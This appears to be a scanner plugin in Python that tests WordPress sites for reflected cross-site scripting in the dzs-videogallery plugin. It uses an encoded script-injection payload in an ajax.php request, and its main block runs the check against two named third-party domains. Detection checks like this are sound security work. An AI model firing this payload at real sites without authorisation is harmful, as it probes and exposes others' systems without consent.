#!/usr/bin/env python
import re

def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl(url + '/wp-content/plugins/dzs-videogallery/ajax.php?ajax=true&height=400&'
        'width=610&type=vimeo&source=%22%2F%3E%3Cscript%3Ealert%28bb2%29%3C%2Fscript%3E')
    if code == 200:
        m = re.search('<script>alert("bb2")</script>', res)
        if m:
            security_info("vulnerable:" + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://www.ytjt.com.cn/')[1])
    audit(assign('wordpress', 'http://www.lockbay.cn/')[1])